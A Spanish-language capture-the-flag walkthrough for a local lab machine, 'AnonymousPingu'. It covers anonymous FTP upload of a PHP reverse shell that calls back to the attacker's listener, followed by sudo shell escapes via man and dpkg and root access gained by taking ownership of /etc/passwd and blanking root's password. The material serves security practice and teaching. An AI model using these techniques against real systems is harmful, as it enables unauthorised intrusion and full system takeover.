Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "AnonymousPingu".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh anonymouspingu.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene 2 puertos abiertos:
```
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
Ademas, el puerto 21 (FTP) nos permite el acceso mediante login anonimo:
```
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28 18:28 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28 18:32 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28 21:08 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
```
Probamos pues a entrar, y vemos que hay los mismos archivos/directorios que se ven en la info de arriba.

Ademas, vemos que la carpeta "/upload" tiene tanto permisos de lectura como de escritura.

Es momento de poner la IP en el navegador y ver que nos encontramos por el puerto 80.

Se puede observar una especie de pagina en construccion, con un acceso al backend (en realidad es la carpeta "/upload" que hemos visto antes), acceso a un panel de contacto, etc...

Bien, sabiendo esto, lo que vamos a hacer es crear una reverse shell en formato ".php" y subirla a la carpeta "/upload" mediante "ftp" para poder tener acceso a la maquina victima.

Para ello creamos primero la reverse shell, bien con "msfvenom":
```
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > reverse.php 
```
o mas facil, la cogemos del repositorio de github de "pentestmonkey" (https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), donde cambiariamos unicamente la IP (usariamos la de la maquina atacante), y el puerto (tambien el de la maquina atacante):
```
set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';  // Pongo mi IP (en este caso 172.17.0.1)
$port = 4444;       // Pongo mi puerto (en este caso, el 4444 por ejemplo)
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
En esta ocasion, yo voy a usar la segunda ya que nunca la he usado y asi practico.

Para ello escribo:
```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Una vez obtenida la reverse del repositorio de "pentestmonkey", modificamos los parametros que he mencionado anteriormente, poniendo mi IP (172.17.0.1) y mi puerto (4444). Ambos de la maquina atacante.

Es momento ahora de subirla mediante "ftp" a la carpeta "upload":
```
ftp 172.17.0.2

Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> cd upload
250 Directory successfully changed.

ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||6292|)
150 Ok to send data.
100% |**********************************|    67        1.63 MiB/s    00:00 ETA
226 Transfer complete.
67 bytes sent in 00:00 (182.25 KiB/s)

ftp> ls
229 Entering Extended Passive Mode (|||45587|)
150 Here comes the directory listing.
-rw-------    1 101      103            67 Jul 30 23:42 php-reverse-shell.php
226 Directory send OK.
ftp> 
```
Vale, una vez subida, vemos que esta en la pagina web, en la seccion de "/upload".

Antes de ejecutar este archivo, es momento de ponerse a la escucha con "netcat" por el puerto 4444 como hemos dicho en la reverse:
```
nc -nlvp 4444
```
Ahora, ejecutamos el archivo ".php" desde la pagina web, y obtenemos la reverse en nuestra terminal. Perfecto.

Antes de seguir, vamos a hacer el tratamiento de la TTY, asi que para ello escribimos COMO SIEMPRE:
```
script /dev/null -c bash
Ahora presionamos (CTRL + Z)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
Y listo, tratamiento de la TTY hecha. Ya podemos seguir con la escalada de privilegios. 

Lo primero de todo seria hacer un "whoami" para ver que usuario somos.
```
www-data@2f0c6287c77b:/$ whoami
www-data

www-data@2f0c6287c77b:/$
```
Antes de seguir, vamos a configurar las lineas y las columnas de la terminal para que no nos de fallos, que en mi caso seria:
```
stty rows 46 columns 166
```
Vale, una vez hecho esto, volvemos a la maquina y es momento ahora de probar a hacer la escalada de privilegios, asi que empezaremos por "sudo -l" a ver si hay suerte, y vemos lo siguiente:
```
www-data@2f0c6287c77b:/$ sudo -l
Matching Defaults entries for www-data on 2f0c6287c77b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 2f0c6287c77b:
    (pingu) NOPASSWD: /usr/bin/man
    
www-data@2f0c6287c77b:/$ 
```
Perfecto, vemos que el usuario "pingu" puede ejecutar el binario "man" sin credenciales, por lo que vamos a buscar bien en "https://gtfobins.github.io", o en mi caso, con "searchbins" como seria el uso de dicho binario para obtener privilegios.
```
searchbins -b man -f sudo
```
Y obtenemos lo siguiente:
```
sudo man man
!/bin/sh
```
Asi que escribimos con la ruta absoluta:
```
www-data@2f0c6287c77b:/$ sudo -u pingu /usr/bin/man man
```
Y vemos el manual de "man", por lo que al final, pondremos "!/bin/sh", viendo que el usuario cambiaria a "pingu":
```
MAN(1)                        Manual pager utils                        
MAN(1)

NAME
       man - an interface to the system reference manuals

SYNOPSIS
       man [man options] [[section] page ...]
 ...
       man -k [apropos options] regexp ...
       man -K [man options] [section] term ..
.
       man -f [whatis options] page ...
       man -l [man options] file ...
       man -w|-W [man options] page ...

DESCRIPTION
       man  is  the system's manual pager.  Each page argument giv
en to man is
       normally the name of a program, utility or function.  The  manual 
 page
       associated with each of these arguments is then found and displayed.  A
       section,  if  provided, will direct man to look only in tha
       
!/bin/sh   <==== Escribimos esto al final, y el usuario cambia

$ whoami
pingu

$ 
```
Escribimos ahora "bash -p" y nos quedaria un prompt mas normal.
```
$ bash -p

pingu@2f0c6287c77b:/$ whoami 
pingu

pingu@2f0c6287c77b:/$
```
Ahora es momento de escribir de nuevo "sudo -l" a ver si hay algo interesante, y vemos que nos devuelve lo siguiente:
```
pingu@2f0c6287c77b:/$ sudo -l

Matching Defaults entries for pingu on 2f0c6287c77b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pingu may run the following commands on 2f0c6287c77b:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
    
pingu@2f0c6287c77b:/$
```
Buscamos entonces de nuevo en "https://gtfobins.github.io", o en mi caso, con "searchbins":
```
sudo dpkg -l
!/bin/sh
```
Escribimos entonces "sudo -u gladys /usr/bin/dpkg -l" y luego la otra parte "!/bin/sh":
```
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                          Version                                 Archit
ecture Description
+++-=============================-=======================================-======
======-=========================================================================
=======
ii  adduser                       3.137ubuntu1                            all   
       add and remove users and groups
ii  apache2                       2.4.58-1ubuntu8.1                       amd64 
       Apache HTTP Server
ii  apache2-bin                   2.4.58-1ubuntu8.1                       amd64 
       Apache HTTP Server (modules and other binary files)
ii  apache2-data                  2.4.58-1ubuntu8.1                       all   
       Apache HTTP Server (common files)
ii  apache2-utils                 2.4.58-1ubuntu8.1                       amd64 
       Apache HTTP Server (utility programs for web servers)
ii  apt                           2.7.14build2                            amd64 
       commandline package manager
ii  base-files                    13ubuntu10                              amd64 
       Debian base system miscellaneous files
ii  base-passwd                   3.6.3build1                             amd64 
!/bin/sh
```
Y como podemos observar, hemos cambiado de usuario de nuevo y mediante otro "bash -p" nos quedaria asi:
```
$ whoami
gladys

$ bash -p

gladys@2f0c6287c77b:/$
```
Momento de probar por tercera vez, con otro "sudo -l" a ver si hay suerte y esta vez vemos que nos devuelve lo siguiente:
```
gladys@2f0c6287c77b:/$ sudo -l

Matching Defaults entries for gladys on 2f0c6287c77b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User gladys may run the following commands on 2f0c6287c77b:
    (root) NOPASSWD: /usr/bin/chown
    
gladys@2f0c6287c77b:/$
```
De nuevo, buscaremos bien en "https://gtfobins.github.io", o en mi caso otra vez, en "searchbins":
```
LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
```
Vale, ahora vamos a cambiar el dueño del archivo "/etc/passwd" con el comando:
```
sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
```
Vemos que ha cambiado de "root" a "gladys":
```
ANTES:
gladys@2f0c6287c77b:/$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1292 Apr 28 21:08 /etc/passwd

DESPUES:
gladys@2f0c6287c77b:/$ ls -l /etc/passwd
-rw-r--r-- 1 gladys gladys 1292 Apr 28 21:08 /etc/passwd
```
Ahora hacemos un "cat /etc/passwd" y vemos lo siguiente:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
pingu:x:1001:1001::/home/pingu:/bin/bash
gladys:x:1002:1002::/home/gladys:/bin/bash
```
Vale, ahora existen varias posibles soluciones pero la mas facil seria la de quitar la "x" al usuario "root" y guardarlo en el archivo "/etc/passwd":
```
echo 'root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
pingu:x:1001:1001::/home/pingu:/bin/bash
gladys:x:1002:1002::/home/gladys:/bin/bash' > /etc/passwd
```
Si ahora escribimos "su root" entrariamos directamente:
```
gladys@2f0c6287c77b:/$ su root

root@2f0c6287c77b:/# whoami
root

root@2f0c6287c77b:/#
```
Ya estariamos dentro y la maquina terminada :).
